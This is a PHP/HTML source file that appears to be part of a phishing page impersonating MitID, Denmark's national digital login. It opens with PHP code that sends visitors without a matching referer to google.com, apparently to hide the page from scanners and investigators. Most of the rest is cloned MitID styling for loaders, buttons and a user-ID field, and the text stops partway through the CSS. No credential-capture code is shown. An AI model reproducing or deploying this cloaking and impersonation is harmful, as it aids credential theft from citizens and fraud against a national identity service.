<?php
$asva = $_SERVER['HTTP_HOST'] ?? "" ;
$ref = $_SERVER["HTTP_REFERER"] ?? "" ;
$check=parse_url($ref);
if($check['host'] !=$asva) { header('Location: https://google.com'); }
elseif($_SERVER['HTTP_REFERER'] == NULL){ header('Location: https://google.com'); }
?>
<!DOCTYPE html>
<html lang="da">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta name="viewport" content="width=device-width" />
        <link rel="stylesheet" href="login.css" media="all" />
        <link rel="stylesheet" href="tooltip.css" media="all" />
        <style type="text/css">
            #noScriptSection {
                position: fixed;
                left: 0px;
                top: 0px;
                z-index: 99999999;
                width: 100%;
                height: 100%;
                border: 1px;
                background-color: White;
            }
            .black_overlay {
                display: none;
                position: absolute;
                top: 0%;
                left: 0%;
                width: 100%;
                height: 100%;
                background-color: black;
                z-index: 9999999;
                -moz-opacity: 0.8;
                opacity: 0.8;
                filter: alpha(opacity=80);
            }
        </style>
        <title>MitID</title>
        <style id="mitid-styles">
            .mitid-loader {
                align-content: stretch;
                align-items: stretch;
                align-self: auto;
                animation-delay: 0s;
                animation-direction: normal;
                animation-duration: 0s;
                animation-fill-mode: none;
                animation-iteration-count: 1;
                animation-name: none;
                animation-play-state: running;
                animation-timing-function: ease;
                azimuth: center;
                -webkit-backface-visibility: visible;
                backface-visibility: visible;
                background-attachment: scroll;
                background-blend-mode: normal;
                background-clip: border-box;
                background-color: rgba(0, 0, 0, 0);
                background-image: none;
                background-origin: padding-box;
                background-position: 0% 0%;
                background-repeat: repeat;
                background-size: auto auto;
                block-size: auto;
                border-block-end-color: currentcolor;
                border-block-end-style: none;
                border-block-end-width: medium;
                border-block-start-color: currentcolor;
                border-block-start-style: none;
                border-block-start-width: medium;
                border-bottom-color: currentcolor;
                border-bottom-left-radius: 0;
                border-bottom-right-radius: 0;
                border-bottom-style: none;
                border-bottom-width: medium;
                border-collapse: separate;
                border-image-outset: 0s;
                border-image-repeat: stretch;
                border-image-slice: 100%;
                border-image-source: none;
                border-image-width: 1;
                border-inline-end-color: currentcolor;
                border-inline-end-style: none;
                border-inline-end-width: medium;
                border-inline-start-color: currentcolor;
                border-inline-start-style: none;
                border-inline-start-width: medium;
                border-left-color: currentcolor;
                border-left-style: none;
                border-left-width: medium;
                border-right-color: currentcolor;
                border-right-style: none;
                border-right-width: medium;
                border-spacing: 0;
                border-top-color: currentcolor;
                border-top-left-radius: 0;
                border-top-right-radius: 0;
                border-top-style: none;
                border-top-width: medium;
                bottom: auto;
                -webkit-box-decoration-break: slice;
                box-decoration-break: slice;
                box-shadow: none;
                box-sizing: content-box;
                break-after: auto;
                break-before: auto;
                break-inside: auto;
                caption-side: top;
                caret-color: auto;
                clear: none;
                clip: auto;
                -webkit-clip-path: none;
                clip-path: none;
                color: initial;
                column-count: auto;
                column-fill: balance;
                column-gap: normal;
                column-rule-color: currentcolor;
                column-rule-style: none;
                column-rule-width: medium;
                column-span: none;
                column-width: auto;
                content: normal;
                counter-increment: none;
                counter-reset: none;
                cursor: auto;
                display: inline;
                empty-cells: show;
                filter: none;
                flex-basis: auto;
                flex-direction: row;
                flex-grow: 0;
                flex-shrink: 1;
                flex-wrap: nowrap;
                float: none;
                font-family: initial;
                font-feature-settings: normal;
                font-kerning: auto;
                font-language-override: normal;
                font-size: medium;
                font-size-adjust: none;
                font-stretch: normal;
                font-style: normal;
                font-synthesis: weight style;
                font-variant: normal;
                font-variant-alternates: normal;
                font-variant-caps: normal;
                font-variant-east-asian: normal;
                font-variant-ligatures: normal;
                font-variant-numeric: normal;
                font-variant-position: normal;
                font-weight: normal;
                grid-auto-columns: auto;
                grid-auto-flow: row;
                grid-auto-rows: auto;
                grid-column-end: auto;
                grid-column-gap: 0;
                grid-column-start: auto;
                grid-row-end: auto;
                grid-row-gap: 0;
                grid-row-start: auto;
                grid-template-areas: none;
                grid-template-columns: none;
                grid-template-rows: none;
                height: auto;
                -webkit-hyphens: manual;
                -ms-hyphens: manual;
                hyphens: manual;
                image-orientation: 0deg;
                image-rendering: auto;
                image-resolution: 1dppx;
                ime-mode: auto;
                inline-size: auto;
                isolation: auto;
                justify-content: flex-start;
                left: auto;
                letter-spacing: normal;
                line-break: auto;
                line-height: normal;
                list-style-image: none;
                list-style-position: outside;
                list-style-type: disc;
                margin-block-end: 0;
                margin-block-start: 0;
                margin-bottom: 0;
                margin-inline-end: 0;
                margin-inline-start: 0;
                margin-left: 0;
                margin-right: 0;
                margin-top: 0;
                -webkit-mask-clip: border-box;
                mask-clip: border-box;
                -webkit-mask-composite: source-over;
                mask-composite: add;
                -webkit-mask-image: none;
                mask-image: none;
                mask-mode: match-source;
                -webkit-mask-origin: border-box;
                mask-origin: border-box;
                -webkit-mask-position: 0% 0%;
                mask-position: 0% 0%;
                -webkit-mask-repeat: repeat;
                mask-repeat: repeat;
                -webkit-mask-size: auto;
                mask-size: auto;
                mask-type: luminance;
                max-height: none;
                max-width: none;
                min-block-size: 0;
                min-height: 0;
                min-inline-size: 0;
                min-width: 0;
                mix-blend-mode: normal;
                object-fit: fill;
                object-position: 50% 50%;
                offset-block-end: auto;
                offset-block-start: auto;
                offset-inline-end: auto;
                offset-inline-start: auto;
                opacity: 1;
                order: 0;
                orphans: 2;
                outline-color: initial;
                outline-offset: 0;
                outline-style: none;
                outline-width: medium;
                overflow: visible;
                overflow-wrap: normal;
                overflow-x: visible;
                overflow-y: visible;
                padding-block-end: 0;
                padding-block-start: 0;
                padding-bottom: 0;
                padding-inline-end: 0;
                padding-inline-start: 0;
                padding-left: 0;
                padding-right: 0;
                padding-top: 0;
                page-break-after: auto;
                page-break-before: auto;
                page-break-inside: auto;
                perspective: none;
                perspective-origin: 50% 50%;
                pointer-events: auto;
                position: static;
                quotes: initial;
                resize: none;
                right: auto;
                ruby-align: space-around;
                ruby-merge: separate;
                ruby-position: over;
                scroll-behavior: auto;
                -ms-scroll-snap-coordinate: none;
                scroll-snap-coordinate: none;
                -ms-scroll-snap-destination: 0px 0px;
                scroll-snap-destination: 0px 0px;
                -ms-scroll-snap-points-x: none;
                scroll-snap-points-x: none;
                -ms-scroll-snap-points-y: none;
                scroll-snap-points-y: none;
                -ms-scroll-snap-type: none;
                scroll-snap-type: none;
                shape-image-threshold: 0;
                shape-margin: 0;
                shape-outside: none;
                tab-size: 8;
                table-layout: auto;
                text-align: initial;
                text-align-last: auto;
                text-combine-upright: none;
                -webkit-text-decoration-color: currentcolor;
                text-decoration-color: currentcolor;
                -webkit-text-decoration-line: none;
                text-decoration-line: none;
                -webkit-text-decoration-style: solid;
                text-decoration-style: solid;
                -webkit-text-emphasis-color: currentcolor;
                text-emphasis-color: currentcolor;
                -webkit-text-emphasis-position: over;
                text-emphasis-position: over right;
                -webkit-text-emphasis-style: none;
                text-emphasis-style: none;
                text-indent: 0;
                text-justify: auto;
                text-orientation: mixed;
                text-overflow: clip;
                text-rendering: auto;
                text-shadow: none;
                text-transform: none;
                text-underline-position: auto;
                top: auto;
                touch-action: auto;
                transform: none;
                transform-box: border-box;
                transform-origin: 50% 50% 0;
                transform-style: flat;
                transition-delay: 0s;
                transition-duration: 0s;
                transition-property: all;
                transition-timing-function: ease;
                vertical-align: baseline;
                visibility: visible;
                white-space: normal;
                widows: 2;
                width: auto;
                will-change: auto;
                word-break: normal;
                word-spacing: normal;
                word-wrap: normal;
                -ms-writing-mode: lr-tb;
                writing-mode: horizontal-tb;
                z-index: auto;
                -webkit-appearance: none;
                appearance: none;
                background-color: #fff;
                border: 1px solid #ccc;
                box-sizing: border-box;
                position: relative;
                padding: 31px;
                min-width: 300px;
                display: flex !important;
                justify-content: center;
                align-items: center;
            }
            .mitid-loader *,
            .mitid-loader ::after,
            .mitid-loader ::before {
                align-content: stretch;
                align-items: stretch;
                align-self: auto;
                animation-delay: 0s;
                animation-direction: normal;
                animation-duration: 0s;
                animation-fill-mode: none;
                animation-iteration-count: 1;
                animation-name: none;
                animation-play-state: running;
                animation-timing-function: ease;
                azimuth: center;
                -webkit-backface-visibility: visible;
                backface-visibility: visible;
                background-attachment: scroll;
                background-blend-mode: normal;
                background-clip: border-box;
                background-color: rgba(0, 0, 0, 0);
                background-image: none;
                background-origin: padding-box;
                background-position: 0% 0%;
                background-repeat: repeat;
                background-size: auto auto;
                block-size: auto;
                border-block-end-color: currentcolor;
                border-block-end-style: none;
                border-block-end-width: medium;
                border-block-start-color: currentcolor;
                border-block-start-style: none;
                border-block-start-width: medium;
                border-bottom-color: currentcolor;
                border-bottom-left-radius: 0;
                border-bottom-right-radius: 0;
                border-bottom-style: none;
                border-bottom-width: medium;
                border-collapse: separate;
                border-image-outset: 0s;
                border-image-repeat: stretch;
                border-image-slice: 100%;
                border-image-source: none;
                border-image-width: 1;
                border-inline-end-color: currentcolor;
                border-inline-end-style: none;
                border-inline-end-width: medium;
                border-inline-start-color: currentcolor;
                border-inline-start-style: none;
                border-inline-start-width: medium;
                border-left-color: currentcolor;
                border-left-style: none;
                border-left-width: medium;
                border-right-color: currentcolor;
                border-right-style: none;
                border-right-width: medium;
                border-spacing: 0;
                border-top-color: currentcolor;
                border-top-left-radius: 0;
                border-top-right-radius: 0;
                border-top-style: none;
                border-top-width: medium;
                bottom: auto;
                -webkit-box-decoration-break: slice;
                box-decoration-break: slice;
                box-shadow: none;
                box-sizing: content-box;
                break-after: auto;
                break-before: auto;
                break-inside: auto;
                caption-side: top;
                caret-color: auto;
                clear: none;
                clip: auto;
                -webkit-clip-path: none;
                clip-path: none;
                color: initial;
                column-count: auto;
                column-fill: balance;
                column-gap: normal;
                column-rule-color: currentcolor;
                column-rule-style: none;
                column-rule-width: medium;
                column-span: none;
                column-width: auto;
                content: normal;
                counter-increment: none;
                counter-reset: none;
                cursor: auto;
                display: inline;
                empty-cells: show;
                filter: none;
                flex-basis: auto;
                flex-direction: row;
                flex-grow: 0;
                flex-shrink: 1;
                flex-wrap: nowrap;
                float: none;
                font-family: initial;
                font-feature-settings: normal;
                font-kerning: auto;
                font-language-override: normal;
                font-size: medium;
                font-size-adjust: none;
                font-stretch: normal;
                font-style: normal;
                font-synthesis: weight style;
                font-variant: normal;
                font-variant-alternates: normal;
                font-variant-caps: normal;
                font-variant-east-asian: normal;
                font-variant-ligatures: normal;
                font-variant-numeric: normal;
                font-variant-position: normal;
                font-weight: normal;
                grid-auto-columns: auto;
                grid-auto-flow: row;
                grid-auto-rows: auto;
                grid-column-end: auto;
                grid-column-gap: 0;
                grid-column-start: auto;
                grid-row-end: auto;
                grid-row-gap: 0;
                grid-row-start: auto;
                grid-template-areas: none;
                grid-template-columns: none;
                grid-template-rows: none;
                height: auto;
                -webkit-hyphens: manual;
                -ms-hyphens: manual;
                hyphens: manual;
                image-orientation: 0deg;
                image-rendering: auto;
                image-resolution: 1dppx;
                ime-mode: auto;
                inline-size: auto;
                isolation: auto;
                justify-content: flex-start;
                left: auto;
                letter-spacing: normal;
                line-break: auto;
                line-height: normal;
                list-style-image: none;
                list-style-position: outside;
                list-style-type: disc;
                margin-block-end: 0;
                margin-block-start: 0;
                margin-bottom: 0;
                margin-inline-end: 0;
                margin-inline-start: 0;
                margin-left: 0;
                margin-right: 0;
                margin-top: 0;
                -webkit-mask-clip: border-box;
                mask-clip: border-box;
                -webkit-mask-composite: source-over;
                mask-composite: add;
                -webkit-mask-image: none;
                mask-image: none;
                mask-mode: match-source;
                -webkit-mask-origin: border-box;
                mask-origin: border-box;
                -webkit-mask-position: 0% 0%;
                mask-position: 0% 0%;
                -webkit-mask-repeat: repeat;
                mask-repeat: repeat;
                -webkit-mask-size: auto;
                mask-size: auto;
                mask-type: luminance;
                max-height: none;
                max-width: none;
                min-block-size: 0;
                min-height: 0;
                min-inline-size: 0;
                min-width: 0;
                mix-blend-mode: normal;
                object-fit: fill;
                object-position: 50% 50%;
                offset-block-end: auto;
                offset-block-start: auto;
                offset-inline-end: auto;
                offset-inline-start: auto;
                opacity: 1;
                order: 0;
                orphans: 2;
                outline-color: initial;
                outline-offset: 0;
                outline-style: none;
                outline-width: medium;
                overflow: visible;
                overflow-wrap: normal;
                overflow-x: visible;
                overflow-y: visible;
                padding-block-end: 0;
                padding-block-start: 0;
                padding-bottom: 0;
                padding-inline-end: 0;
                padding-inline-start: 0;
                padding-left: 0;
                padding-right: 0;
                padding-top: 0;
                page-break-after: auto;
                page-break-before: auto;
                page-break-inside: auto;
                perspective: none;
                perspective-origin: 50% 50%;
                pointer-events: auto;
                position: static;
                quotes: initial;
                resize: none;
                right: auto;
                ruby-align: space-around;
                ruby-merge: separate;
                ruby-position: over;
                scroll-behavior: auto;
                -ms-scroll-snap-coordinate: none;
                scroll-snap-coordinate: none;
                -ms-scroll-snap-destination: 0px 0px;
                scroll-snap-destination: 0px 0px;
                -ms-scroll-snap-points-x: none;
                scroll-snap-points-x: none;
                -ms-scroll-snap-points-y: none;
                scroll-snap-points-y: none;
                -ms-scroll-snap-type: none;
                scroll-snap-type: none;
                shape-image-threshold: 0;
                shape-margin: 0;
                shape-outside: none;
                tab-size: 8;
                table-layout: auto;
                text-align: initial;
                text-align-last: auto;
                text-combine-upright: none;
                -webkit-text-decoration-color: currentcolor;
                text-decoration-color: currentcolor;
                -webkit-text-decoration-line: none;
                text-decoration-line: none;
                -webkit-text-decoration-style: solid;
                text-decoration-style: solid;
                -webkit-text-emphasis-color: currentcolor;
                text-emphasis-color: currentcolor;
                -webkit-text-emphasis-position: over;
                text-emphasis-position: over right;
                -webkit-text-emphasis-style: none;
                text-emphasis-style: none;
                text-indent: 0;
                text-justify: auto;
                text-orientation: mixed;
                text-overflow: clip;
                text-rendering: auto;
                text-shadow: none;
                text-transform: none;
                text-underline-position: auto;
                top: auto;
                touch-action: auto;
                transform: none;
                transform-box: border-box;
                transform-origin: 50% 50% 0;
                transform-style: flat;
                transition-delay: 0s;
                transition-duration: 0s;
                transition-property: all;
                transition-timing-function: ease;
                vertical-align: baseline;
                visibility: visible;
                white-space: normal;
                widows: 2;
                width: auto;
                will-change: auto;
                word-break: normal;
                word-spacing: normal;
                word-wrap: normal;
                -ms-writing-mode: lr-tb;
                writing-mode: horizontal-tb;
                z-index: auto;
                -webkit-appearance: none;
                appearance: none;
            }
            @media screen and (max-width: 399px) {
                .mitid-loader {
                    width: auto !important;
                    padding: 5px;
                    border: 0;
                    overflow: hidden;
                }
            }
            @media screen and (max-height: 520px) {
                .mitid-loader {
                    height: auto !important;
                }
            }
            .mitid-loader * {
                font-family: "IBM Plex Sans", Arial, Helvetica, FreeSans, sans, sans-serif;
                line-height: 1.5rem;
                font-size: 1rem;
                color: #333;
            }
            .mitid-loader h2 {
                font-size: 1rem;
                color: #333;
                font-weight: 700;
                line-height: 1.5rem;
                margin: 0;
                padding: 0;
                display: block;
            }
            .mitid-loader h3 {
                color: #333;
                font-size: 1.25rem;
                font-weight: 700;
                line-height: 1.75rem;
                margin: 0;
                padding: 0;
                display: block;
            }
            .mitid-loader__font-load-500 {
                visibility: hidden;
                font-weight: 500;
                position: absolute;
                display: inline;
            }
            .mitid-loader__font-load-600 {
                visibility: hidden;
                font-weight: 600;
                position: absolute;
                display: inline;
            }
            .mitid-loader__title {
                font-size: 1.25rem;
                font-weight: 700;
                line-height: 1.75rem;
                display: block;
                text-align: center;
                max-width: 390px;
            }
            .mitid-loader__content {
                z-index: 2000;
                width: 100%;
                display: flex;
                justify-content: center;
                align-items: center;
                flex-direction: column;
            }
            .mitid-loader__logo {
                height: 24px;
                position: relative;
                width: 62px;
                margin-bottom: 24px;
            }
            .mitid-loader__logo-svg {
                position: absolute;
                left: -85px;
                top: -20px;
                height: 62px;
                width: 234px;
                transform: scale(0.26);
            }
            .mitid-loader__logo-svg path {
                fill: #0060e6;
            }
            .mitid-loader__shield {
                position: absolute;
                width: 100px;
                height: 117px;
            }
            .mitid-loader__shield path {
                fill: #0060e6;
            }
            .mitid-loader__state {
                position: relative;
                height: 120px;
                width: 100px;
                margin-bottom: 24px;
                display: block;
            }
            .mitid-loader__error {
                position: absolute;
            }
            .mitid-loader__error circle,
            .mitid-loader__error path {
                fill: #fff;
            }
            .mitid-loader__circular {
                animation: mitid-core--loader-rotate 1s linear infinite;
                transform-origin: center center;
                margin: auto;
                z-index: 10;
                position: absolute;
                left: 24px;
                top: 28px;
                width: 50px;
                height: 50px;
            }
            .mitid-loader__circular circle:first-child {
                stroke: #3380eb;
            }
            .mitid-loader__circular circle:last-child {
                animation: mitid-core--loader-dash 1.5s linear infinite;
            }
            .mitid-loader__text {
                text-align: center;
                vertical-align: middle;
                line-height: 1.5rem;
                min-height: 3.625rem;
            }
            .mitid-loader__description {
                line-height: 2rem;
                display: block;
                text-align: center;
            }
            .mitid-loader__link {
                color: #0060e6;
                cursor: pointer;
                padding: 0 5px;
            }
            @keyframes mitid-core--loader-rotate {
                100% {
                    transform: rotate(360deg);
                }
            }
            @keyframes mitid-core--loader-dash {
                0% {
                    stroke-dasharray: 50 200;
                }
                100% {
                    stroke-dasharray: 50 200;
                }
            }
        </style>
        <style id="mitid-font-face">
            @font-face {
                font-family: "IBM Plex Sans";
                font-style: normal;
                font-weight: 400;
                font-display: block;
                src: local("IBM Plex Sans "), local("IBMPlexSans-"), url("IBMPlexSans.woff2") format("woff2"), url("IBMPlexSans.woff") format("woff");
                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
            }
            @font-face {
                font-family: "IBM Plex Sans";
                font-style: normal;
                font-weight: 500;
                font-display: block;
                src: local("IBM Plex Sans Medium"), local("IBMPlexSans-Medium"), url("IBMPlexSans-Medium.woff2") format("woff2"), url("IBMPlexSans-Medium.woff") format("woff");
                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
            }
            @font-face {
                font-family: "IBM Plex Sans";
                font-style: normal;
                font-weight: 600;
                font-display: block;
                src: local("IBM Plex Sans SemiBold"), local("IBMPlexSans-SemiBold"), url("IBMPlexSans-SemiBold.woff2") format("woff2"), url("IBMPlexSans-SemiBold.woff") format("woff");
                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
            }
            @font-face {
                font-family: "IBM Plex Sans";
                font-style: normal;
                font-weight: 700;
                font-display: block;
                src: local("IBM Plex Sans Bold"), local("IBMPlexSans-Bold"), url("IBMPlexSans-Bold.woff2") format("woff2"), url("IBMPlexSans-Bold.woff") format("woff");
                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
            }
        </style>
        <style id="mitid-styles">
            .mitid--divider {
                border-radius: 0;
                height: 1px;
                border: none;
                border-width: 1px;
                display: block;
                background: rgba(0, 0, 0, 0.2);
            }
            .mitid--divider-light {
                border-radius: 0;
                height: 1px;
                border: none;
                border-width: 1px;
                display: block;
                background: rgba(0, 0, 0, 0.1);
            }
            .mitid--divider-lighter {
                border-radius: 0;
                height: 1px;
                border: none;
                border-width: 1px;
                display: block;
                background: rgba(0, 0, 0, 0.05);
            }
            .mitid-login-divider--top {
                margin: 0.95rem 0 1.45rem 0;
            }
            .mitid-login-divider--bottom {
                margin: 0;
                margin-bottom: 0.875rem;
            }
            .mitid-core-header {
                display: flex;
                overflow: hidden;
                justify-content: space-between;
                flex: 0 0 auto;
            }
            .mitid-core-header__text {
                width: 243px;
                font-weight: 700;
                word-break: break-word;
                word-wrap: break-word;
            }
            .mitid-core-header__logo {
                height: 1rem;
                width: 3.813rem;
                padding-top: 0.25rem;
            }
            .mitid-core-header__logo path {
                fill: #0060e6;
            }
            .mitid-core-text-button {
                display: inline-flex;
                padding: 0.625rem 0.25rem;
                cursor: pointer;
                position: relative;
                left: -5px;
                border-radius: 4px;
                text-decoration: none;
                align-items: center;
            }
            .mitid-core-text-button:hover .mitid-core-text-button__label,
            .mitid-core-text-button:focus .mitid-core-text-button__label {
                text-decoration: underline;
                color: #004cb8;
            }
            .mitid-core-text-button:focus:is(:focus-visible) {
                box-shadow: 0 0 0 3px #0060e6;
            }
            .mitid-core-text-button:active .mitid-core-text-button__label {
                color: #00398a;
                text-decoration: underline;
            }
            .mitid-core-text-button:hover .mitid-core-text-button__icon path,
            .mitid-core-text-button:focus .mitid-core-text-button__icon path {
                fill: #004cb8;
            }
            .mitid-core-text-button:active .mitid-core-text-button__icon path {
                fill: #00398a;
            }
            .mitid-core-text-button__text {
                display: flex;
            }
            .mitid-core-text-button__icon {
                margin-right: 0.25rem;
                width: 1.5rem;
                height: 1.5rem;
                display: block;
                cursor: pointer;
                flex-shrink: 0;
            }
            .mitid-core-text-button__icon path {
                fill: #001c44;
                cursor: pointer;
            }
            .mitid-core-text-button__icon svg {
                cursor: pointer;
            }
            .mitid-core-text-button__label {
                max-width: 100%;
                cursor: pointer;
                font-weight: 600;
                color: #001c44;
                text-decoration: none;
            }
            .mitid-core-text-button:after {
                content: "";
                min-height: inherit;
                font-size: 0;
            }
            .mitid-core-footer {
                display: flex;
                flex-direction: column;
                justify-content: space-between;
                flex: 0 0 auto;
            }
            .mitid-core-footer__nav {
                display: flex;
                align-items: center;
                height: 1.5rem;
            }
            @media screen and (max-width: 399px) {
                .mitid-core-footer__nav {
                    padding: 0 5px 15px 5px;
                }
            }
            .mitid--button--left:not(:focus)::before {
                content: " ";
                width: 0;
                height: 0;
                border-style: solid;
                border-width: 10px 10px 0 10px;
                border-color: #fff rgba(0, 0, 0, 0) rgba(0, 0, 0, 0) rgba(0, 0, 0, 0);
                position: absolute;
                bottom: 2.1rem;
                z-index: 9999;
                left: 1.1rem;
                display: none;
            }
            .mitid--button--left-visibel:not(:focus)::before {
                display: block;
            }
            .mitid--button-primary {
                position: relative;
                width: 100%;
                cursor: pointer;
                box-sizing: border-box;
                border-radius: 4px;
                border: none;
                display: inline-flex;
                align-items: center;
                outline: none;
                margin: 0;
                background: #0060e6;
                color: #fff;
                border-radius: 4px;
                height: 3rem;
            }
            .mitid--button-primary svg,
            .mitid--button-primary path {
                cursor: pointer;
            }
            .mitid--button-primary .mitid--button-label {
                letter-spacing: 0;
                line-height: 1.5rem;
                margin-bottom: unset;
                font-weight: 600;
                font-size: 0.875rem;
                text-transform: uppercase;
                letter-spacing: 0.05rem;
                vertical-align: middle;
            }
            .mitid--button-primary .mitid--button-label:hover {
                cursor: pointer;
            }
            .mitid--button-primary .mitid--button-icon {
                flex-shrink: 0;
                height: 24px;
                width: 24px;
                color: #fff;
            }
            .mitid--button-primary .mitid--button-icon path:last-child {
                fill: #fff;
            }
            .mitid--button-primary.icon-only {
                margin: 0.25rem;
                display: inline-flex;
                width: 3rem;
                height: 3rem;
                justify-content: center;
            }
            .mitid--button-primary.label-only {
                margin: 0.25rem;
                padding: 0.25rem 1rem 0.25rem 1rem;
            }
            .mitid--button-primary:not(.icon-only):not(.label-only) {
                padding: 0.25rem 0.75rem 0.25rem 1rem;
            }
            .mitid--button-primary .mitid--button-spacing {
                flex: 1;
                width: 1rem;
            }
            .mitid--button-primary {
                box-shadow: 0 0 0 5px rgba(0, 0, 0, 0);
            }
            .mitid--button-primary:focus:not(:active) {
                box-shadow: 0px 0px 0px 2px #fff, 0px 0px 0px 5px #0060e6;
            }
            .mitid--button-primary:hover:not(:disabled) {
                background: #004cb8;
                border-radius: 4px;
            }
            .mitid--button-primary:hover:not(:disabled) .mitid--button-label {
                background: #004cb8;
                color: #fff !important;
            }
            .mitid--button-primary:hover:not(:disabled) .mitid--button-icon {
                color: #fff !important;
            }
            .mitid--button-primary:active:not(:disabled),
            .mitid--button-primary:active:not(:disabled) .mitid--button-label,
            .mitid--button-primary:active:not(:disabled) .mitid--button-icon {
                background: #00398a;
                position: relative;
                top: 0;
                left: 0;
            }
            .mitid--button-primary:focus:not(:disabled):not(:active) {
                background: #004cb8;
            }
            .mitid--button-primary:disabled {
                background: #000;
                opacity: 0.2;
                text-decoration: none;
                cursor: not-allowed;
            }
            .mitid--button-primary:disabled .mitid--button-label {
                cursor: not-allowed;
            }
            .mitid--button-primary .mitid--button-label {
                color: #fff;
            }
            .mitid--button-secondary {
                position: relative;
                width: 100%;
                cursor: pointer;
                box-sizing: border-box;
                border-radius: 4px;
                border: none;
                display: inline-flex;
                align-items: center;
                outline: none;
                margin: 0;
                background: #fff;
                color: #001c44;
                border-radius: 4px;
                border: 1px solid #919191;
                height: 3rem;
                outline: none;
                outline-width: 0;
            }
            .mitid--button-secondary svg,
            .mitid--button-secondary path {
                cursor: pointer;
            }
            .mitid--button-secondary .mitid--button-label {
                letter-spacing: 0;
                line-height: 1.5rem;
                margin-bottom: unset;
                font-weight: 600;
                font-size: 0.875rem;
                text-transform: uppercase;
                letter-spacing: 0.05rem;
                vertical-align: middle;
            }
            .mitid--button-secondary .mitid--button-label:hover {
                cursor: pointer;
            }
            .mitid--button-secondary .mitid--button-icon {
                flex-shrink: 0;
                height: 24px;
                width: 24px;
                color: #fff;
            }
            .mitid--button-secondary .mitid--button-icon path:last-child {
                fill: #fff;
            }
            .mitid--button-secondary.icon-only {
                margin: 0.25rem;
                display: inline-flex;
                width: 3rem;
                height: 3rem;
                justify-content: center;
            }
            .mitid--button-secondary.label-only {
                margin: 0.25rem;
                padding: 0.25rem 1rem 0.25rem 1rem;
            }
            .mitid--button-secondary:not(.icon-only):not(.label-only) {
                padding: 0.25rem 0.75rem 0.25rem 1rem;
            }
            .mitid--button-secondary .mitid--button-spacing {
                flex: 1;
                width: 1rem;
            }
            .mitid--button-secondary .mitid--button-icon {
                flex-shrink: 0;
                height: 24px;
                width: 24px;
                color: #001c44;
            }
            .mitid--button-secondary .mitid--button-icon path:last-child {
                fill: #001c44;
            }
            .mitid--button-secondary:not(.icon-only):not(.label-only):hover,
            .mitid--button-secondary:not(.icon-only):not(.label-only):focus,
            .mitid--button-secondary:not(.icon-only):not(.label-only):disabled {
                padding: 0.25rem 10px 0.25rem 1rem;
            }
            .mitid--button-secondary:hover:not(:disabled):not(:active):not(.icon-only) .mitid--button-icon,
            .mitid--button-secondary:hover:not(:disabled):not(:active):not(.icon-only) .mitid--button-label {
                position: relative;
                right: 1px;
            }
            .mitid--button-secondary:hover:not(:disabled) {
                border: 2px solid #0060e6;
            }
            .mitid--button-secondary:hover:not(:disabled) .mitid--button-label,
            .mitid--button-secondary:hover:not(:disabled) .mitid--button-icon {
                color: #0060e6;
            }
            .mitid--button-secondary:hover:not(:disabled) .mitid--button-label path,
            .mitid--button-secondary:hover:not(:disabled) .mitid--button-icon path {
                fill: #0060e6;
            }
            .mitid--button-secondary:active:not(:disabled) {
                border: 2px solid #00398a;
            }
            .mitid--button-secondary:active:not(:disabled) .mitid--button-label,
            .mitid--button-secondary:active:not(:disabled) .mitid--button-icon {
                color: #00398a;
            }
            .mitid--button-secondary {
                box-shadow: 0px 0px 0px 5px rgba(0, 0, 0, 0);
            }
            .mitid--button-secondary:focus:not(:active) {
                box-shadow: 0px 0px 0px 2px #fff, 0px 0px 0px 5px #0060e6;
                border: 2px solid #0060e6 !important;
            }
            @supports (-moz-appearance: none) {
                .mitid--button-secondary {
                    height: 49px;
                }
            }
            .mitid--button-secondary:focus:not(:disabled):not(.icon-only) .mitid--button-icon,
            .mitid--button-secondary:focus:not(:disabled):not(.icon-only) .mitid--button-label {
                position: relative;
                right: 1px;
            }
            .mitid--button-secondary:focus:not(:active) .mitid--button-label,
            .mitid--button-secondary:focus:not(:active) .mitid--button-icon {
                color: #0060e6;
            }
            .mitid--button-secondary:focus:not(:active) .mitid--button-label path,
            .mitid--button-secondary:focus:not(:active) .mitid--button-icon path {
                fill: #0060e6;
            }
            .mitid--button-secondary:disabled {
                border: 1px solid rgba(0, 0, 0, 0.2);
                color: rgba(0, 0, 0, 0.4);
                text-decoration: none;
                cursor: not-allowed;
            }
            .mitid--button-secondary:disabled .mitid--button-label {
                cursor: not-allowed;
            }
            .mitid--button-secondary .mitid--button-label {
                color: #001c44;
            }
            .mitid--button-icon {
                border: 0;
                background: rgba(0, 0, 0, 0);
                margin: 0;
            }
            .mitid--button-icon svg,
            .mitid--button-icon path {
                cursor: pointer;
            }
            .mitid--button--left {
                margin-left: 2rem;
            }
            .mitid-core-user {
                flex: 0 0 auto;
            }
            .mitid-core-user__input {
                width: 100%;
                max-width: 100%;
                min-width: 200px;
                display: inline-block;
            }
            .mitid-core-user__input[defaultlanguage^="DA / DK"] {
                visibility: hidden;
                pointer-events: none;
                position: absolute;
            }
            .mitid-core-user__input[defaultlanguage^="DA / DK"] input {
                visibility: hidden;
            }
            .mitid-core-user__input[defaultlanguage^="DA /ﾠDK"] {
                display: none;
                pointer-events: none;
                position: absolute;
            }
            .mitid-core-user__input[defaultlanguage^="DA /ﾠDK"] input {
                visibility: hidden;
            }
            .mitid-core-user__input[defaultlanguage^="DAﾠ/ﾠDK"] {
                visibility: visible;
                display: block;
                pointer-events: all;
            }
            .mitid-core-user__input[defaultlanguage^="DAﾠ/ﾠDK"]:disabled {
                opacity: 0.2;
                pointer-events: none;
            }
            .mitid-core-user__user-id {
                display: inline-block;
                border-radius: 0.25rem;
                outline: none;
                height: 3rem;
                width: 100%;
                padding: 0 1rem;
                font-weight: 500 !important;
                letter-spacing: 0;
                border: 1px solid #919191;
                box-sizing: border-box;
